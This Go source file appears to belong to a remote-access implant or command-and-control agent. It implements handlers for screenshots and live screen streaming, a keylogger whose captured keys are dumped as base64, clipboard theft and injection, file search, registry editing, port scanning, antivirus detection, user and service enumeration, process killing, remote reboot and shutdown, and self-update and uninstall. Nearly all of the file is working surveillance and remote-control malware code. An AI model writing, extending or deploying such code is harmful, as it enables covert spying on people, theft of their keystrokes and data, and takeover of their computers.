//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
)

// ── Screenshot / Screen Stream ──────────────────────────────────────────

func handleScreenshot(task Task, res *TaskResult) {
	results := takeScreenshotChunked(65)
	if len(results) == 0 {
		res.Error = "screenshot failed"
		return
	}
	if results[0].Error != "" {
		res.Error = results[0].Error
		return
	}
	if len(results) == 1 {
		res.Output = results[0].Output
		res.Encoding = results[0].Encoding
		res.Size = results[0].Size
		inFastMode.Store(true)
		return
	}
	// Multi-chunk: append chunks to pendingResults. The beacon loop and the
	// task worker both touch pendingResults through the bounded enqueue helper.
	stampScreenshotTask(task.ID, results)
	enqueueResults(results)
	res.Output = "screenshot_chunked"
	res.Size = int64(len(results))
	inFastMode.Store(true)
}

func handleScreenStreamStart(task Task, res *TaskResult) {
	vs := parseVideoSettings(task.Command)
	intervalSec, quality := vs.Interval, vs.Quality
	if !atomic.CompareAndSwapInt32(&screenStreaming, 0, 1) {
		res.Output = fmt.Sprintf("screen stream already running (interval=%ds quality=%d codec=%s fps=%d)", intervalSec, quality, vs.Codec, vs.FPS)
		return
	}
	// Capture synchronously first so we never report "started" on a stream
	// that cannot produce frames (headless/DUMMY display, no grabber, etc.).
	first, err := takeScreenshotJPEG(quality)
	if err != nil {
		atomic.StoreInt32(&screenStreaming, 0)
		res.Error = "screen stream failed to start: " + err.Error()
		return
	}
	go func() {
		if atomic.LoadInt32(&screenStreaming) != 1 {
			return
		}
		sendScreenFrame(first)
		// Video mode: use FPS-derived interval when codec is h264 and FPS>1
		interval := time.Duration(intervalSec) * time.Second
		if vs.Codec == "h264" && vs.FPS > 1 {
			interval = time.Duration(1000/vs.FPS) * time.Millisecond
			if interval < 100*time.Millisecond {
				interval = 100 * time.Millisecond
			}
		}
		timer := time.NewTimer(interval)
		defer timer.Stop()
		for {
			<-timer.C
			if atomic.LoadInt32(&screenStreaming) != 1 {
				return
			}
			data, err := takeScreenshotJPEG(quality)
			if err != nil {
				atomic.StoreInt32(&screenStreaming, 0)
				sendScreenStreamError("screen stream stopped: " + err.Error())
				return
			}
			sendScreenFrame(data)
			timer.Reset(interval)
		}
	}()
	res.Output = fmt.Sprintf("screen stream started (interval=%ds quality=%d codec=%s)", intervalSec, quality, vs.Codec)
}

func parseScreenStreamSettings(command string) (intervalSec int, quality int) {
	s := parseVideoSettings(command)
	return s.Interval, s.Quality
}

type VideoSettings struct {
	Interval int
	Quality  int
	FPS      int
	Codec    string
	Bitrate  string
	Width    int
	Mime     string
}

func parseVideoSettings(command string) VideoSettings {
	s := VideoSettings{Interval: 5, Quality: 65, FPS: 5, Codec: "jpeg", Bitrate: "800k"}
	command = strings.TrimSpace(command)
	if command == "" {
		return s
	}
	parts := strings.Split(command, ",")
	if len(parts) >= 1 {
		if v, err := strconv.Atoi(strings.TrimSpace(parts[0])); err == nil && v >= 1 && v <= 60 {
			s.Interval = v
			s.FPS = 1000 / (v * 1000) // placeholder, will be overridden if fps provided
			if s.FPS < 1 {
				s.FPS = 1
			}
			if s.FPS > 30 {
				s.FPS = 30
			}
		}
	}
	if len(parts) >= 2 {
		q := strings.TrimSpace(strings.ToLower(parts[1]))
		switch q {
		case "high":
			s.Quality = 85
		case "medium":
			s.Quality = 65
		case "low":
			s.Quality = 40
		default:
			if v, err := strconv.Atoi(q); err == nil && v > 0 && v <= 100 {
				s.Quality = v
			}
		}
	}
	if len(parts) >= 3 {
		if w, err := strconv.Atoi(strings.TrimSpace(parts[2])); err == nil && w >= 320 && w <= 3840 {
			s.Width = w
		}
	}
	if len(parts) >= 4 {
		m := strings.ToLower(strings.TrimSpace(parts[3]))
		if m == "h264" || m == "vp8" || m == "jpeg" || m == "png" || m == "webp" {
			s.Codec = m
			s.Mime = m
		}
	}
	if len(parts) >= 5 && strings.TrimSpace(parts[4]) != "" {
		s.Bitrate = strings.TrimSpace(parts[4])
	}
	// FPS derived from interval if not explicitly set: 5fps for video mode when interval <1s
	if s.Interval <= 1 {
		s.FPS = 15
	} else if s.Interval <= 2 {
		s.FPS = 5
	} else {
		s.FPS = 1
	}
	return s
}

func handleScreenStreamStop(task Task, res *TaskResult) {
	atomic.StoreInt32(&screenStreaming, 0)
	res.Output = "screen stream stopped"
}

func handleScreenshotWindow(task Task, res *TaskResult) {
	results := takeScreenshotChunked(85)
	if len(results) == 0 {
		res.Error = "screenshot failed"
		return
	}
	if results[0].Error != "" {
		res.Error = results[0].Error
		return
	}
	if len(results) == 1 {
		res.Output = results[0].Output
		res.Encoding = results[0].Encoding
		res.Size = results[0].Size
		return
	}
	stampScreenshotTask(task.ID, results)
	enqueueResults(results)
	res.Output = "screenshot_chunked"
	res.Size = int64(len(results))
}

// ── Keylogger ───────────────────────────────────────────────────────────

func handleKeyloggerStart(task Task, res *TaskResult) {
	// The agent must not claim "keylogger started" on platforms where the
	// loop is a no-op (Linux/macOS have no GetAsyncKeyState equivalent).
	if err := keyloggerAvailable(); err != nil {
		res.Error = "keylogger unavailable: " + err.Error()
		return
	}
	// Compare-and-swap atomically claims the single active keylogger slot, so a
	// second start (or a start racing a still-exiting loop) cannot launch a
	// duplicate goroutine that would double-log and corrupt the buffer.
	if atomic.CompareAndSwapInt32(&keylogActive, 0, 1) {
		go keyloggerLoop()
	}
	res.Output = "keylogger started"
}

func handleKeyloggerStop(task Task, res *TaskResult) {
	atomic.StoreInt32(&keylogActive, 0)
	res.Output = "keylogger stopped"
}

func handleKeyloggerDump(task Task, res *TaskResult) {
	keylogMu.Lock()
	data := keylogBuffer.String()
	keylogBuffer.Reset()
	keylogMu.Unlock()
	if data == "" {
		res.Output = "(no keys logged yet)"
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(data))
		res.Encoding = "base64"
	}
}

// ── Process ─────────────────────────────────────────────────────────────

func handleSuspend(task Task, res *TaskResult) {
	out, err := suspendProcess(task.Command)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleResume(task Task, res *TaskResult) {
	out, err := resumeProcess(task.Command)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleKillProc(task Task, res *TaskResult) {
	out, err := killProcess(task.Command)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

// ── Clipboard ───────────────────────────────────────────────────────────

func handleClipboardGet(task Task, res *TaskResult) {
	out, err := clipboardGet()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handleClipboardSet(task Task, res *TaskResult) {
	err := clipboardSet(task.Command)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = "clipboard set"
	}
}

// ── Search / Registry ───────────────────────────────────────────────────

func handleFind(task Task, res *TaskResult) {
	out, err := findFiles(task.Path, task.Command)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handleRegGet(task Task, res *TaskResult) {
	out, err := regGet(task.Command) //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
	if err != nil {                  //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleRegSet(task Task, res *TaskResult) {
	err := regSet(task.Path, task.Data) //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
	if err != nil {                     //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
		res.Error = err.Error()
	} else {
		res.Output = "reg set"
	}
}

func handleRegDelete(task Task, res *TaskResult) {
	err := regDelete(task.Command) //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
	if err != nil {                //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
		res.Error = err.Error()
	} else {
		res.Output = "reg deleted"
	}
}

// ── Recon ───────────────────────────────────────────────────────────────

func handlePortscan(task Task, res *TaskResult) {
	network := "tcp"
	switch strings.ToLower(strings.TrimSpace(task.Shell)) {
	case "udp":
		network = "udp"
	case "tcp_syn", "tcp_connect", "tcp", "":
		network = "tcp"
	}
	out, err := portScan(task.Command, network)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleNetstat(task Task, res *TaskResult) {
	out, err := netStat()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handleUsers(task Task, res *TaskResult) {
	out, err := listUsers()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handleAV(task Task, res *TaskResult) {
	out, err := detectAV()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handleServices(task Task, res *TaskResult) {
	out, err := listServices()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

// ── System ──────────────────────────────────────────────────────────────

func handleReboot(task Task, res *TaskResult) {
	cmdStr := "shutdown /r /t 0"
	if runtime.GOOS != "windows" {
		cmdStr = "reboot"
	}
	out, err := runShell(cmdStr, "")
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = "reboot initiated: " + out
	}
}

func handleShutdown(task Task, res *TaskResult) {
	cmdStr := "shutdown /s /t 0"
	if runtime.GOOS != "windows" {
		cmdStr = "shutdown -h now"
	}
	out, err := runShell(cmdStr, "")
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = "shutdown initiated: " + out
	}
}

func handleDrives(task Task, res *TaskResult) {
	out, err := listDrives()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handleBeaconNow(task Task, res *TaskResult) {
	res.Output = "beacon forced"
}

func handleUninstall(task Task, res *TaskResult) {
	out, err := uninstallSelf()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleKill(task Task, res *TaskResult) {
	res.Output = "Agent terminating..."
	sendTaskResult(*res)
	time.Sleep(300 * time.Millisecond)
	os.Exit(0)
}

func handleSelfUpdate(task Task, res *TaskResult) {
	if task.Command == "" {
		res.Error = "self_update: command required"
		return
	}
	result := selfUpdate(task.Command)
	// Verification failures must be reported as errors (and must not exit as
	// success). Only a clean platform replace path is allowed to exit.
	if strings.HasPrefix(result, "failed") ||
		strings.HasPrefix(result, "self_update:") ||
		strings.Contains(result, "signature verification failed") ||
		strings.Contains(result, "no update signing key pinned") ||
		strings.Contains(result, "refused") {
		res.Error = result
		return
	}
	res.Output = result
	sendTaskResult(*res)
	time.Sleep(500 * time.Millisecond)
	os.Exit(0)
}
